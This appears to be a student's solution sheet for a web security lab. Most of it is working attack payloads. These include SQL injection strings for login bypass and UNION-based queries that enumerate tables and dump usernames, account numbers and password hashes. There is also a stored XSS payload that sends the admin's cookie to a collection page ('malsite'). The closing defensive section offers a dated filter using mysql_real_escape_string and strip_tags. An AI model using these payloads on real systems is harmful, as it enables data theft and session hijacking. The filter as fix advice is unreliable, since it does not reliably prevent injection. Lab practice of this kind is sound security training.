Task 1
Q1:  1' or '1' = '1' ORDER BY id DESC -- --

Q2:  admin' -- --

Q3:  
##paste the following injections to the "Enter user ID" input box

# used the following to check for the number of columns

	-1 union select NULL,NULL,NULL,NULL,NULL,NULL -- --
# used the following to get the name of the tables in the database

	-1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()-- --
# used the following to check for column names in the tables

	-1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=database()-- --

# finally the following dumps all the user info along with md5 hashes

	-1 union select 1,2,3,group_concat(username," ",fullname," ",accountNumber," ",password),5,6 from users-- --

Task 2
Q1:  paste the following code/line to the fullname input box
#website defacement ??? not sure if this is non-persistent or persistent

tom riddle<script>document.body.bgColor="tomato";</script>

Q2: paste the following code/line to the fullname input box
#used the following Cross-site script to steal the admin session/cookie
#check malsite for database storage code, you can find our how to use the session/cookie to gain access

<script>new Image().src = "http://localhost/malsite/index.php?joys="+document.cookie+"&site="+document.location.href;</script>


Task 3
#change all $_REQUESTS['..'] to use the following function
function filter_me($input){
	$input = stripslashes($input);
	$input = strip_tags($input);
	$input = mysql_real_escape_string($input);
	return $input;
}

Example:
	#make sure the function is included  before the code on every page
	$u = filter_me($_REQUESTS['username']);